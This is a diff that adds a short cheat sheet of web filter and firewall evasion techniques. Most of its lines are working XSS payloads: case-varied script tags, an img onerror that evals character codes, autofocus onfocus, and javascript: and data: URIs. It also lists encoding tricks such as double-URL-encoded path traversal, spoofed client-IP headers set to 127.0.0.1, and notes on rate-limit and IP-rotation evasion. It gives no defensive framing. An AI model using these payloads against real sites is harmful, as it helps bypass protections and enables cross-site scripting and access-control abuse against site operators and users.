@@ -1,0 +1,36 @@
+Hex Encoding: 0x3c7363726970743e = <script>
+Unicode Escaping: \u003c = <
+Base64 Encoding: YWxlcnQoMSk= = alert(1)
+Double URL Encoding: %252e%252e%252f = ../
+HTML Entity Encoding: &lt;script&gt; = <script>
+Case Variation: <ScRiPt>alert('XSS')</ScRiPt>
+Null Byte Injection: %00<script>
+Comment Insertion: /*!50000comment*/
+Whitespace Injection: <	
+script>
+String Concatenation: '<' + 'script>'
+Attribute Bypass: <img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
+Event Bypass: <input onfocus="alert('XSS')" autofocus>
+Javascript Protocol: javascript:alert('XSS')
+Data Protocol: data:text/html,<script>alert('XSS')</script>
+Javascript Void: <a href="javascript:void(0)" onclick="alert('XSS')">Click</a>
+X-Forwarded-For Header: X-Forwarded-For: 127.0.0.1
+X-Original-IP Header: X-Original-IP: 127.0.0.1
+X-Client-IP Header: X-Client-IP: 127.0.0.1
+Client-IP Header: Client-IP: 127.0.0.1
+CF-Connecting-IP Header: CF-Connecting-IP: 127.0.0.1
+True-Client-IP Header: True-Client-IP: 127.0.0.1
+User-Agent Rotation: Random User-Agent string per request
+Referer Spoofing: Fake or random Referer header
+Cookie Manipulation: Custom cookies per request
+Rate Limiting Bypass: Randomized request delays
+IP Rotation: Proxy chain rotation
+HTTP Method Variation: GET to POST, POST to PUT
+Content-Type Manipulation: application/json vs application/x-www-form-urlencoded
+Boundary Bypass: Multipart form-data boundary changes
+Polygot Payloads: Valid across multiple contexts
+Comment Obfuscation: /**/ /* */ -- # %00
+Fuzzing Techniques: Buffer overflow patterns
+Escape Sequence Bypass: \x3c = <
+NVT ASCII: Control character injection
+Mixed Encoding: Combine multiple encoding methods
